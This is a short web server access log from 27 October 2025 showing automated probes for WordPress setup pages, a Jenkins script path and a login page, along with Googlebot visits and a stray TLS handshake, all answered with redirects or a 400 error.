172.70.240.119 - - [27/Oct/2025:11:17:26 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.49 - - [27/Oct/2025:11:18:00 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
82.146.44.21 - - [27/Oct/2025:11:22:33 +0000] "GET / HTTP/1.1" 301 169 "-" "Chrome/86.0.4240.198" "-"
54.246.143.208 - - [27/Oct/2025:11:33:33 +0000] "GET /script/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "-"
54.246.143.208 - - [27/Oct/2025:11:33:33 +0000] "GET /jenkins/script HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Knoppix; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0" "-"
104.23.223.37 - - [27/Oct/2025:11:35:47 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.184.244.208 - - [27/Oct/2025:11:35:48 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;WOW64;Trident/5.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;MediaCenterPC6.0;HPNTDF;.NET4.0C)" "147.45.185.25"
104.23.221.48 - - [27/Oct/2025:11:37:07 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
204.76.203.219 - - [27/Oct/2025:11:54:12 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
172.70.251.197 - - [27/Oct/2025:12:00:08 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.10.60 - - [27/Oct/2025:12:00:53 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
101.32.218.31 - - [27/Oct/2025:12:09:11 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
62.141.44.236 - - [27/Oct/2025:12:09:19 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54" "-"
66.249.69.227 - - [27/Oct/2025:12:09:34 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.69.227 - - [27/Oct/2025:12:09:35 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.122 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
82.146.44.21 - - [27/Oct/2025:12:17:40 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "-"
104.23.223.36 - - [27/Oct/2025:12:22:31 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.36 - - [27/Oct/2025:12:23:01 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
180.102.134.69 - - [27/Oct/2025:12:25:23 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
91.184.244.208 - - [27/Oct/2025:12:40:44 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;MediaCenterPC6.0;eSobiSubscriber1.0.0.40;MAAR;.NET4.0C;InfoPath.2)" "147.45.185.25"
94.139.230.114 - - [27/Oct/2025:12:40:57 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1" "-"
104.23.221.49 - - [27/Oct/2025:12:45:19 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.49 - - [27/Oct/2025:12:45:24 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
93.174.93.12 - - [27/Oct/2025:13:00:00 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-" "-"
